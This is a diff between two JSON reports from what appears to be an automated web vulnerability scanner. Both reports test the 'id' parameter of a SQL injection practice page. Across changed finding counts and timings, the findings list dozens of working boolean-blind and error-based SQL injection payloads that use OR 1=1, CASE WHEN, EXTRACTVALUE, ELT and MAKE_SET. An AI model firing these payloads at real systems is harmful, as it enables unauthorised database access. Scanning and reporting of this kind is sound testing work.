@@ -1,11 +1,11 @@
 {
   "metadata": {
-    "scan_time": "2026-04-24 10:26:46",
+    "scan_time": "2026-04-24 10:49:39",
     "summary": {
       "queued": 11328,
       "completed": 11328,
       "failures": 0,
-      "findings": 32
+      "findings": 23
     }
   },
   "vulnerabilities": [
@@ -24,7 +24,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0099,
+        "response_time": 0.0174,
         "error_log": null
       }
     },
@@ -43,7 +43,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0139,
+        "response_time": 0.0177,
         "error_log": null
       }
     },
@@ -62,7 +62,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.056,
+        "response_time": 0.0616,
         "error_log": null
       }
     },
@@ -81,7 +81,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0559,
+        "response_time": 0.0616,
         "error_log": null
       }
     },
@@ -100,45 +100,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0558,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1=(''||(CASE WHEN (1=1) THEN '1' ELSE '0' END)||'') AND 'SVSDAAAAvunVASDAAAA' LIKE 'SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0152,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1=(''||(CASE WHEN (1=1) THEN '1' ELSE '0' END)||'') OR 'SVSDAAAAvunVASDAAAA1'='SVSDAAAAvunVASDAAAA2",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0709,
+        "response_time": 0.0615,
         "error_log": null
       }
     },
@@ -157,140 +119,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0441,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)) AND 'SVSDAAAAvunVASDAAAA' LIKE 'SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0443,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1 IN (SELECT (''+(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END))+'')) AND 'SVSDAAAAvunVASDAAAA' LIKE 'SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0785,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1=(''||(CASE WHEN (1=1) THEN '1' ELSE '0' END)||'') AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0721,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1 IN (SELECT (''+(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END))+'')) AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0776,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)) AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0444,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1 IN (SELECT (''+(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END))+'')) OR 'SVSDAAAAvunVASDAAAA1'='SVSDAAAAvunVASDAAAA2",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0765,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1=1 AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0643,
+        "response_time": 0.0659,
         "error_log": null
       }
     },
@@ -309,7 +138,26 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0775,
+        "response_time": 0.1047,
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'OR 1=1 AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1046,
         "error_log": null
       }
     },
@@ -328,7 +176,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0775,
+        "response_time": 0.1007,
         "error_log": null
       }
     },
@@ -340,14 +188,14 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'OR 1=CONCAT('',(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),'') AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-error_based",
+        "payload_value": "'OR 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)) AND 'SVSDAAAAvunVASDAAAA' LIKE 'SVSDAAAAvunVASDAAAA",
+        "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0564,
+        "response_time": 0.1052,
         "error_log": null
       }
     },
@@ -359,33 +207,14 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'OR 1=CONCAT('',(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),'') AND 'SVSDAAAAvunVASDAAAA' LIKE 'SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-error_based",
+        "payload_value": "'OR 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)) AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
+        "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0565,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR 1=CONCAT('',(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),'') OR 'SVSDAAAAvunVASDAAAA1'='SVSDAAAAvunVASDAAAA2",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0564,
+        "response_time": 0.1052,
         "error_log": null
       }
     },
@@ -404,26 +233,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0176,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR CASE WHEN 1=1 THEN 1 ELSE JSON('SVSDAAAAvunVASDAAAA') END AND 'SVSDAAAAvunVASDAAAA' LIKE 'SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0485,
+        "response_time": 0.065,
         "error_log": null
       }
     },
@@ -442,7 +252,26 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0476,
+        "response_time": 0.0651,
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'OR CASE WHEN 1=1 THEN 1 ELSE JSON('SVSDAAAAvunVASDAAAA') END AND 'SVSDAAAAvunVASDAAAA' LIKE 'SVSDAAAAvunVASDAAAA",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0653,
         "error_log": null
       }
     },
@@ -461,64 +290,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0461,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR ELT(1=1,1) AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0463,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR EXTRACTVALUE(1,CASE WHEN (1=1) THEN 1 ELSE 0x3A END) AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0298,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR EXTRACTVALUE(1,CASE WHEN (1=1) THEN 1 ELSE 0x3A END) OR 'SVSDAAAAvunVASDAAAA1'='SVSDAAAAvunVASDAAAA2",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0298,
+        "response_time": 0.0513,
         "error_log": null
       }
     },
@@ -537,7 +309,26 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0464,
+        "response_time": 0.0512,
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'OR EXTRACTVALUE(1,CASE WHEN (1=1) THEN 1 ELSE 0x3A END) OR 'SVSDAAAAvunVASDAAAA1'='SVSDAAAAvunVASDAAAA2",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0279,
         "error_log": null
       }
     },
@@ -556,7 +347,45 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0731,
+        "response_time": 0.0462,
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'OR ELT(1=1,1) AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0517,
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'OR EXTRACTVALUE(1,CASE WHEN (1=1) THEN 1 ELSE 0x3A END) AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0849,
         "error_log": null
       }
     },
@@ -575,26 +404,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0109,
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'OR MAKE_SET(1=1,1) AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.033,
+        "response_time": 0.0737,
         "error_log": null
       }
     },
@@ -613,7 +423,26 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0528,
+        "response_time": 0.0727,
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'OR MAKE_SET(1=1,1) AND 'SVSDAAAAvunVASDAAAA'='SVSDAAAAvunVASDAAAA",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0736,
         "error_log": null
       }
     }
